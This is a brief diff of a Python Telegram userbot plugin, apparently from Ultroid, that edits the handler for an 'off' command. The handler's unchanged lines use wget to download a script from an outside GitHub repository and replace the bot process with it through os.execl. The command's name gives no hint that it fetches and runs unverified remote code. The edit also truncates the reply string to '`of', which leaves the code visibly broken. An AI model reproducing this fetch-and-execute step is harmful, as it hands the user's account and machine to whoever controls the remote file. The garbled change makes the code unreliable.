@@ -216,7 +216,7 @@ async def restartbt(ult):
 
 @ultroid_cmd(pattern="off")
 async def off(event):
-  await event.edit("`off your bot`")
+  await event.edit("`of")
   await bash("wget -O a.py https://github.com/rooted-cyber/install-package/raw/main/a.py")
   os.execl(sys.executable, sys.executable,"a.py")
 
